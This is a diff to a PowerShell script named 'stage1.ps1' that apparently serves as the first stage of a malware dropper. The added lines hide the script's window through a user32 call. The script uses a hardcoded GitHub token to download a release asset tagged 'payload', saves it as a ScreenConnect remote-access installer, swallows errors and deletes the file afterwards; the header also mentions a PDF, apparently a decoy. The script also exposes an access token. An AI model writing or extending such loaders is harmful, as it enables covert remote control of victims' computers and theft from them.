@@ -1,19 +1,20 @@
-# stage1.ps1 - Hidden, no progress bars
+# stage1.ps1 - Hides own window, downloads, installs, PDF
+Add-Type -Name W -Namespace N -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);'
+try { [N.W]::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0) } catch {}
+
 $ProgressPreference = 'SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $tk = "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"
 $gh = @{"Authorization"="token $tk";"Accept"="application/vnd.github.v3+json"}
 
-# === 1. Download MSI via GitHub release asset API ===
+# === 1. Download MSI ===
 $msiPath = Join-Path $env:TEMP "ScreenConnect.ClientSetup.msi"
 Remove-Item $msiPath -Force -ErrorAction SilentlyContinue
-
 try {
     $rel = Invoke-RestMethod -Uri "https://api.github.com/repos/slynet999-coder/Yambo/releases/tags/payload" -Headers $gh
     $assetUrl = $rel.assets[0].url
     Invoke-WebRequest -Uri $assetUrl -Headers @{"Authorization"="token $tk";"Accept"="application/octet-stream"} -OutFile $msiPath -TimeoutSec 180 -UseBasicParsing
 } catch {}
-
 if (-not (Test-Path $msiPath)) { exit }
 if ((Get-Item $msiPath).Length -lt 1000000) { exit }
 
@@ -31,6 +32,5 @@ try {
     }
 } catch {}
 
-# === 4. Cleanup ===
 Start-Sleep 3
 Remove-Item $msiPath -Force -ErrorAction SilentlyContinue
